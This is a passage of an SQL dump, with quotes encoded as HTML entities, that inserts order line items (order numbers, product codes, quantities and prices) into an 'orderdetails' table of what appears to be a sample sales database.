\u0026#39;151.88\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10139\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;91.18\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10139\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;52.47\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10139\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;101.58\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10139\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;81.35\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10139\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;93.49\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10140\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;186.44\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10140\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;131.49\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10140\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;118.90\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10140\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;95.67\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10140\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;51.05\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10140\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;100.50\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10140\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;40.25\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10140\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;118.84\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10140\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;87.64\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10140\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;62.05\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10140\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;101.15\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10141\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;114.95\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10141\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;160.46\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10141\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;103.09\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10141\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;143.94\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10141\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;50.86\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10141\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;32.18\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10141\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;104.09\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10141\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;53.03\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10141\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;94.92\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10142\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;166.24\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10142\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;140.50\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10142\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;167.83\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10142\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;129.76\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10142\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;95.80\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10142\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;122.08\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10142\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;79.87\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10142\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;114.29\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10142\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;74.35\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10142\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;60.90\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10142\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;56.24\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10142\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;55.34\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10142\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;77.08\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10142\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;92.16\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10142\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;91.37\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10142\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;46.96\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10143\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;133.28\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10143\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;126.15\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10143\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;70.54\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10143\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;99.52\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10143\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;63.71\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10143\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;59.83\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10143\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;74.64\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10143\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;55.96\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10143\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;34.91\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10143\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;86.77\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10143\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;87.80\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10143\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;79.78\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10143\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;69.39\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10143\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;70.40\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10143\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;65.15\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10143\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;49.66\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10144\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;56.41\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10145\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;76.56\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10145\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;104.67\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10145\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;154.93\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10145\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;146.10\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10145\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;71.81\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10145\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;52.70\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10145\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;103.68\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10145\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;87.54\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10145\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;63.98\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10145\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;56.10\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10145\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;71.73\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10145\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;99.89\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10145\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;39.43\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10145\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;95.93\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10145\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;73.22\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10145\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;113.90\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10146\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;60.30\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10146\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;130.94\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10147\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;161.49\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10147\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;110.39\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10147\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;74.21\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10147\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;97.89\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10147\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;70.84\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10147\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;74.78\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10147\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;129.35\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10147\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;33.23\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10147\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;48.98\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10147\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;123.58\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10147\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;72.76\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10148\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;114.65\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10148\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;108.26\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10148\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;136.56\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10148\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;113.52\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10148\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;143.94\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10148\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;135.63\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10148\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;83.75\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10148\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;66.28\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10148\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;65.41\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10148\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;46.29\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10148\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;77.24\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10148\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;115.09\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10148\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;71.91\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10148\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;96.37\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10149\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;87.33\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10149\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;48.52\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10149\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;156.40\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10149\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;50.85\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10149\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;125.86\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10149\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;167.06\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10149\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;89.29\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10149\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;31.20\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10149\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;39.87\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10149\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;38.57\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10149\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;90.57\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10150\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;182.16\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10150\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;121.15\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10150\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;135.30\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10150\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;95.67\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10150\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;93.21\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10150\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;56.21\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10150\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;97.39\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10150\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;111.39\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10150\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;47.29\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10150\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;62.05\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10150\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;95.08\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10151\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;114.95\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10151\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;152.27\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10151\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;106.78\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10151\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;58.34\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10151\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;167.65\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10151\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;109.90\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10151\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;29.35\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10151\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;84.75\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10151\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;43.29\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10151\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;108.81\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10152\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;117.77\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10152\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;49.13\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10152\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;112.37\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10152\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;57.17\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10153\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;201.57\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10153\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;128.42\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10153\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;155.72\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10153\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;125.66\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES 